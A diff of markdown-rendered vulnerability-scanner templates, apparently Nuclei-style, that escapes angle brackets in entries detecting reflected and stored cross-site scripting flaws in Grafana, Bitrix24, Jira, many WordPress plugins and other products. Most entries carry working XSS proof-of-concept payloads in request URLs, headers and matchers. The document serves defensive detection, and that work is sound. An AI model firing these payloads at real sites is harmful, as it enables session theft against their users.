 ## Description
 - Revive Adserver 5.0.3 and prior contains a reflected cross-site scripting vulnerability in the publicly accessible afr.php delivery script. In older versions, it is possible to steal the session identifier and gain access to the admin interface. The query string sent to the www/delivery/afr.php script is printed back without proper escaping, allowing an attacker to execute arbitrary JavaScript code on the browser of the victim.
 
@@ -4174,7 +4174,7 @@ SAMLResponse=%22%3E%3Csvg/onload=alert(/{{randstr}}/)%3E
     1. (?mi)window\.location\.replace\(".*alert\(1337\)
 
 ---
-# Contentful <=2020-05-21 - Cross-Site Scripting
+# Contentful \<=2020-05-21 - Cross-Site Scripting
 ## Description
 - Contentful through 2020-05-21 for Python contains a reflected cross-site scripting vulnerability via the api parameter to the-example-app.py.
 
@@ -4183,7 +4183,7 @@ SAMLResponse=%22%3E%3Csvg/onload=alert(/{{randstr}}/)%3E
 ## Requests
 ### Step - 1
 ```
-GET /?cda'"</script><script>alert(document.domain)</script>&locale=locale=de-DE HTTP/1.1 HTTP/1.1
+GET /?cda'"\</script>\<script>alert(document.domain)\</script>&locale=locale=de-DE HTTP/1.1 HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -4192,7 +4192,7 @@ Host: {{Hostname}}
 **Type - word**
 - words
     1. {'api': '
-    2. </script><script>alert(document.domain)</script>',
+    2. \</script>\<script>alert(document.domain)\</script>',
 - condition - and
 
 **Type - word**
@@ -4205,7 +4205,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Grafana <=6.7.1 - Cross-Site Scripting
+# Grafana \<=6.7.1 - Cross-Site Scripting
 ## Description
 - Grafana through 6.7.1 contains an unauthenticated stored cross-site scripting vulnerability due to insufficient input protection in the originalUrl field, which allows an attacker to inject JavaScript code that will be executed after clicking on Open Original Dashboard after visiting the snapshot.
 - severity - medium
@@ -4263,7 +4263,7 @@ Connection: close
 
 **Type - word**
 - words
-    1. <img src=x onerror=alert(document.domain)>
+    1. \<img src=x onerror=alert(document.domain)>
 - part - body
 
 **Type - status**
@@ -4289,7 +4289,7 @@ Connection: close
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - status**
@@ -4302,7 +4302,7 @@ Connection: close
     1. text/html
 
 ---
-# Jenkins Gitlab Hook <=1.4.2 - Cross-Site Scripting
+# Jenkins Gitlab Hook \<=1.4.2 - Cross-Site Scripting
 ## Description
 - Jenkins Gitlab Hook 1.4.2 and earlier does not escape project names in the build_now endpoint, resulting in a reflected cross-site scripting vulnerability.
 - severity - medium
@@ -4320,7 +4320,7 @@ Connection: close
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -4328,7 +4328,7 @@ Connection: close
     1. text/html
 
 ---
-# Bitrix24 <=20.0.0 - Cross-Site Scripting
+# Bitrix24 \<=20.0.0 - Cross-Site Scripting
 ## Description
 - The Web Application Firewall in Bitrix24 up to and including 20.0.0 allows XSS via the items[ITEMS][ID] parameter to the components/bitrix/mobileapp.list/ajax.php/ URI.
 - severity - medium
@@ -4336,15 +4336,15 @@ Connection: close
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/bitrix/components/bitrix/mobileapp.list/ajax.php/?=&AJAX_CALL=Y&items%5BITEMS%5D%5BBOTTOM%5D%5BLEFT%5D=&items%5BITEMS%5D%5BTOGGLABLE%5D=test123&=&items%5BITEMS%5D%5BID%5D=<a+href="/*">*/%29%7D%29;function+__MobileAppList()%7Balert(1)%7D//>
+- {{BaseURL}}/bitrix/components/bitrix/mobileapp.list/ajax.php/?=&AJAX_CALL=Y&items%5BITEMS%5D%5BBOTTOM%5D%5BLEFT%5D=&items%5BITEMS%5D%5BTOGGLABLE%5D=test123&=&items%5BITEMS%5D%5BID%5D=\<a+href="/*">*/%29%7D%29;function+__MobileAppList()%7Balert(1)%7D//>
 - {{BaseURL}}/bitrix/components/bitrix/mobileapp.list/ajax.php/?=&AJAX_CALL=Y&items%5BITEMS%5D%5BBOTTOM%5D%5BLEFT%5D=&items%5BITEMS%5D%5BTOGGLABLE%5D=test123&=&items%5BITEMS%5D%5BID%5D=%3Cimg+src=%22//%0d%0a)%3B//%22%22%3E%3Cdiv%3Ex%0d%0a%7D)%3Bvar+BX+=+window.BX%3Bwindow.BX+=+function(node,+bCache)%7B%7D%3BBX.ready+=+function(handler)%7B%7D%3Bfunction+__MobileAppList(test)%7Balert(document.domain)%3B%7D%3B//%3C/div%3E
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. <a href="/*">*/)});function __MobileAppList(){alert(1)}//
-    2. function(handler){};function __MobileAppList(test){alert(document.domain);};//</div>
+    1. \<a href="/*">*/)});function __MobileAppList(){alert(1)}//
+    2. function(handler){};function __MobileAppList(test){alert(document.domain);};//\</div>
 - condition - or
 
 **Type - word**
@@ -4371,7 +4371,7 @@ Connection: close
 **Type - word**
 - condition - and
 - words
-    1. location.href='</script><script>alert(document.domain)</script>
+    1. location.href='\</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -4397,7 +4397,7 @@ Connection: close
 
 **Type - word**
 - words
-    1. "></script><script>alert(document.domain)</script>
+    1. ">\</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - status**
@@ -4410,7 +4410,7 @@ Connection: close
     1. text/html
 
 ---
-# PacsOne Server <7.1.1 - Cross-Site Scripting
+# PacsOne Server \<7.1.1 - Cross-Site Scripting
 ## Description
 - PacsOne Server (PACS Server In One Box) below 7.1.1 is vulnerable to cross-site scripting.
 - severity - medium
@@ -4428,7 +4428,7 @@ Connection: close
 
 **Type - word**
 - words
-    1. <img src="" onerror="alert(1);">1</img>
+    1. \<img src="" onerror="alert(1);">1\</img>
 - part - body
 
 **Type - status**
@@ -4436,7 +4436,7 @@ Connection: close
     1. 200
 
 ---
-# TileServer GL <=3.0.0 - Cross-Site Scripting
+# TileServer GL \<=3.0.0 - Cross-Site Scripting
 ## Description
 - TileServer GL through 3.0.0 is vulnerable to reflected cross-site scripting via server.js  because the content of the key GET parameter is reflected unsanitized in an HTTP response for the application's main page.
 - severity - medium
@@ -4458,11 +4458,11 @@ Connection: close
 
 **Type - word**
 - words
-    1. '>"<svg/onload=confirm('xss')>
+    1. '>"\<svg/onload=confirm('xss')>
 - part - body
 
 ---
-# WordPress GTranslate <2.8.52 - Cross-Site Scripting
+# WordPress GTranslate \<2.8.52 - Cross-Site Scripting
 ## Description
 - WordPress GTranslate plugin before 2.8.52 contains an unauthenticated reflected cross-site scripting vulnerability via a crafted link. This requires use of the hreflang tags feature within a sub-domain or sub-directory paid option.
 
@@ -4471,13 +4471,13 @@ Connection: close
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/does_not_exist"%22%3E%3Cscript%3Ealert("XSS")%3C/script%3E<img%20src=x
+- {{BaseURL}}/does_not_exist"%22%3E%3Cscript%3Ealert("XSS")%3C/script%3E\<img%20src=x
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. <script>alert("XSS")</script>
+    1. \<script>alert("XSS")\</script>
 
 **Type - word**
 - part - header
@@ -4506,7 +4506,7 @@ Connection: close
 
 **Type - word**
 - words
-    1. <img src=x onerror=alert(1)>
+    1. \<img src=x onerror=alert(1)>
 - part - body
 
 **Type - word**
@@ -4526,7 +4526,7 @@ Connection: close
 ```
 GET /user/login.php HTTP/1.1
 Host: {{Hostname}}
-Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
+Referer: xss"/>\<img src="#" onerror="alert(document.domain)"/>
 
 ```
 ### Matchers
@@ -4534,7 +4534,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 **Type - word**
 - part - body
 - words
-    1. fromurl" type="hidden" value="xss"/><img src="#" onerror="alert(document.domain)"/>
+    1. fromurl" type="hidden" value="xss"/>\<img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - part - header
@@ -4546,7 +4546,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# Jira Subversion ALM for Enterprise <8.8.2 - Cross-Site Scripting
+# Jira Subversion ALM for Enterprise \<8.8.2 - Cross-Site Scripting
 ## Description
 - Jira Subversion ALM for Enterprise before 8.8.2 contains a cross-site scripting vulnerability at multiple locations.
 - severity - medium
@@ -4563,7 +4563,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. <script>alert(document.domain)</script>
+    1. \<script>alert(document.domain)\</script>
 - part - body
 
 **Type - status**
@@ -4605,7 +4605,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# WSO2 Carbon Management Console <=5.10 - Cross-Site Scripting
+# WSO2 Carbon Management Console \<=5.10 - Cross-Site Scripting
 ## Description
 - WSO2 Management Console through 5.10 is susceptible to reflected cross-site scripting which can be exploited by tampering a request parameter in Management Console. This can be performed in both authenticated and unauthenticated requests.
 - severity - medium
@@ -4645,7 +4645,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. "/></script><script>alert(document.domain)</script>
+    1. "/>\</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - status**
@@ -4671,7 +4671,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -4701,7 +4701,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. "><script>alert(document.domain)</script>
+    1. ">\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -4710,9 +4710,9 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 - part - header
 
 ---
-# Quixplorer <=2.4.1 - Cross Site Scripting
+# Quixplorer \<=2.4.1 - Cross Site Scripting
 ## Description
-- Quixplorer <=2.4.1 is vulnerable to reflected cross-site scripting (XSS) caused by improper validation of user supplied input. A remote attacker could exploit this vulnerability using a specially crafted URL to execute a script in a victim's Web browser within the security context of the hosting Web site, once the URL is clicked. An attacker could use this vulnerability to steal the victim's cookie-based authentication credentials.
+- Quixplorer \<=2.4.1 is vulnerable to reflected cross-site scripting (XSS) caused by improper validation of user supplied input. A remote attacker could exploit this vulnerability using a specially crafted URL to execute a script in a victim's Web browser within the security context of the hosting Web site, once the URL is clicked. An attacker could use this vulnerability to steal the victim's cookie-based authentication credentials.
 
 - severity - medium
 - tags - cve,cve2020,quixplorer,xss
@@ -4725,7 +4725,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>&srt=yes
+    1. \<script>alert(document.domain)\</script>&srt=yes
     2. My Download
 - condition - and
 
@@ -4739,7 +4739,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# WordPress 15Zine <3.3.0 - Cross-Site Scripting
+# WordPress 15Zine \<3.3.0 - Cross-Site Scripting
 ## Description
 - WordPress 15Zine before 3.3.0 is vulnerable to reflected cross-site scripting because the theme does not sanitize the cbi parameter before including it in the HTTP response via the cb_s_a AJAX action.
 
@@ -4754,7 +4754,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -4780,7 +4780,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. <frame name="hmcontent" src="javascript:alert(document.domain)" title="Content frame">
+    1. \<frame name="hmcontent" src="javascript:alert(document.domain)" title="Content frame">
 - part - body
 
 **Type - status**
@@ -4810,7 +4810,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. <h1>hello</h1><script>alert(/{{randstr}}/)</script>
+    1. \<h1>hello\</h1>\<script>alert(/{{randstr}}/)\</script>
 - part - body
 
 **Type - word**
@@ -4833,7 +4833,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. value=""><script>alert(document.domain)</script>
+    1. value="">\<script>alert(document.domain)\</script>
 
 **Type - word**
 - words
@@ -4858,7 +4858,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - status**
@@ -4890,7 +4890,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. <svg/onload=alert(1)>
+    1. \<svg/onload=alert(1)>
 - part - body
 
 **Type - word**
@@ -4912,7 +4912,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. <svg/onload=alert(1)>
+    1. \<svg/onload=alert(1)>
 - part - body
 
 **Type - word**
@@ -4925,7 +4925,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# IceWarp WebMail Server <=11.4.4.1 - Cross-Site Scripting
+# IceWarp WebMail Server \<=11.4.4.1 - Cross-Site Scripting
 ## Description
 - IceWarp Webmail Server through 11.4.4.1 contains a cross-site scripting vulnerability in the /webmail/ color parameter.
 - severity - medium
@@ -4938,7 +4938,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. <svg/onload=alert(document.domain)>
+    1. \<svg/onload=alert(document.domain)>
 - part - body
 
 **Type - status**
@@ -4960,13 +4960,13 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/CuteSoft_Client/CuteEditor/Template.aspx?Referrer=XSS";><script>alert(document.domain)</script>
+- {{BaseURL}}/CuteSoft_Client/CuteEditor/Template.aspx?Referrer=XSS";>\<script>alert(document.domain)\</script>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script></p>
+    1. \<script>alert(document.domain)\</script>\</p>
     2. System.Web
 - condition - and
 
@@ -4980,7 +4980,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# WordPress Tidio Gallery <=1.1 - Cross-Site Scripting
+# WordPress Tidio Gallery \<=1.1 - Cross-Site Scripting
 ## Description
 - WordPress plugin tidio-gallery v1.1 contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 - severity - medium
@@ -4993,7 +4993,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5006,7 +5006,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# WordPress Simpel Reserveren <=3.5.2 - Cross-Site Scripting
+# WordPress Simpel Reserveren \<=3.5.2 - Cross-Site Scripting
 ## Description
 - WordPress plugin Simpel Reserveren 3.5.2 and before contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 - severity - medium
@@ -5019,7 +5019,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5032,7 +5032,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# WordPress defa-online-image-protector <=3.3 - Cross-Site Scripting
+# WordPress defa-online-image-protector \<=3.3 - Cross-Site Scripting
 ## Description
 - WordPress defa-online-image-protector 3.3 and before contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 - severity - medium
@@ -5045,7 +5045,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5058,7 +5058,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# WordPress HDW Video Gallery <=1.2 - Cross-Site Scripting
+# WordPress HDW Video Gallery \<=1.2 - Cross-Site Scripting
 ## Description
 - WordPress HDW Video Gallery 1.2 and before contains a cross-site scripting vulnerability via playlist.php which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 - severity - medium
@@ -5071,7 +5071,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5084,7 +5084,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# WordPress e-search <=1.0 - Cross-Site Scripting
+# WordPress e-search \<=1.0 - Cross-Site Scripting
 ## Description
 - WordPress e-search 1.0 and before contains a reflected cross-site scripting vulnerability via title_az.php which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 - severity - medium
@@ -5097,7 +5097,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5110,7 +5110,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# SPIP <3.1.2 - Cross-Site Scripting
+# SPIP \<3.1.2 - Cross-Site Scripting
 ## Description
 - SPIP 3.1.2 and earlier contains a cross-site scripting vulnerability in valider_xml.php which allows remote attackers to inject arbitrary web script or HTML via the var_url parameter in a valider_xml action.
 
@@ -5124,7 +5124,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. "></script><script>alert(document.domain)</script>
+    1. ">\</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - status**
@@ -5137,7 +5137,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. text/html
 
 ---
-# WordPress HDW Video Gallery <=1.2 - Cross-Site Scripting
+# WordPress HDW Video Gallery \<=1.2 - Cross-Site Scripting
 ## Description
 - WordPress HDW Video Gallery 1.2 and before contains a cross-site scripting vulnerability via mychannel.php which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 - severity - medium
@@ -5150,7 +5150,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5163,7 +5163,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# WordPress e-search <=1.0 - Cross-Site Scripting
+# WordPress e-search \<=1.0 - Cross-Site Scripting
 ## Description
 - Wordpress plugin e-search 1.0 and before contains a cross-site scripting vulnerability via date_select.php which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 - severity - medium
@@ -5176,7 +5176,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5189,7 +5189,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# WordPress AJAX Random Post <=2.00 - Cross-Site Scripting
+# WordPress AJAX Random Post \<=2.00 - Cross-Site Scripting
 ## Description
 - WordPress AJAX Random Post 2.00 is vulnerable to reflected cross-site scripting.
 - severity - medium
@@ -5202,7 +5202,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5215,7 +5215,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# WordPress Admin Font Editor <=1.8 - Cross-Site Scripting
+# WordPress Admin Font Editor \<=1.8 - Cross-Site Scripting
 ## Description
 - WordPress Admin Font Editor plugin indexisto 1.8 and before contains a cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 - severity - medium
@@ -5228,7 +5228,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5241,7 +5241,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# WordPress WPSOLR <=8.6 - Cross-Site Scripting
+# WordPress WPSOLR \<=8.6 - Cross-Site Scripting
 ## Description
 - WordPress WPSOLR 8.6 and before contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 - severity - medium
@@ -5254,7 +5254,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5267,7 +5267,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# WordPress New Year Firework <=1.1.9 - Cross-Site Scripting
+# WordPress New Year Firework \<=1.1.9 - Cross-Site Scripting
 ## Description
 - WordPress New Year Firework 1.1.9 and before contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 - severity - medium
@@ -5280,7 +5280,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5306,7 +5306,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5319,7 +5319,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# Aruba Airwave <8.2.3.1 - Cross-Site Scripting
+# Aruba Airwave \<8.2.3.1 - Cross-Site Scripting
 ## Description
 - Aruba Airwave before version 8.2.3.1 is vulnerable to reflected cross-site scripting.
 - severity - medium
@@ -5332,7 +5332,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - status**
@@ -5358,7 +5358,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5371,7 +5371,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# WordPress Pondol Form to Mail <=1.1 - Cross-Site Scripting
+# WordPress Pondol Form to Mail \<=1.1 - Cross-Site Scripting
 ## Description
 - WordPress Pondol Form to Mail 1.1 and before contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 - severity - medium
@@ -5384,7 +5384,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5410,7 +5410,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5423,7 +5423,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# WordPress S3 Video <=0.983 - Cross-Site Scripting
+# WordPress S3 Video \<=0.983 - Cross-Site Scripting
 ## Description
 - WordPress S3 Video and before contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 - severity - medium
@@ -5436,7 +5436,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script><"
+    1. \</script>\<script>alert(document.domain)\</script>\<"
 - part - body
 
 **Type - word**
@@ -5449,7 +5449,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# WordPress WHIZZ <=1.0.7 - Cross-Site Scripting
+# WordPress WHIZZ \<=1.0.7 - Cross-Site Scripting
 ## Description
 - WordPress plugin WHIZZ 1.07 and before contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 - severity - medium
@@ -5462,7 +5462,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5488,7 +5488,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5501,7 +5501,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# WordPress Admin Font Editor <=1.8 - Cross-Site Scripting
+# WordPress Admin Font Editor \<=1.8 - Cross-Site Scripting
 ## Description
 - WordPress Admin Font Editor 1.8 and before contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 - severity - medium
@@ -5514,7 +5514,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5527,7 +5527,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# WordPress anti-plagiarism <=3.60 - Cross-Site Scripting
+# WordPress anti-plagiarism \<=3.60 - Cross-Site Scripting
 ## Description
 - WordPress anti-plagiarism 3.6.0 and prior are vulnerable to reflected cross-site scripting.
 - severity - medium
@@ -5540,7 +5540,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5566,7 +5566,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5579,7 +5579,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# WordPress Infusionsoft Gravity Forms <=1.5.11 - Cross-Site Scripting
+# WordPress Infusionsoft Gravity Forms \<=1.5.11 - Cross-Site Scripting
 ## Description
 - WordPress plugin Infusionsoft 1.5.11 and before contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 - severity - medium
@@ -5592,7 +5592,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. "><script>alert(document.domain);</script><"
+    1. ">\<script>alert(document.domain);\</script>\<"
     2. input type="text" name="ContactId"
 - condition - and
 - part - body
@@ -5607,7 +5607,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# WordPress Tidio-form <=1.0 - Cross-Site Scripting
+# WordPress Tidio-form \<=1.0 - Cross-Site Scripting
 ## Description
 - WordPress tidio-form1.0 contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 - severity - medium
@@ -5620,7 +5620,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
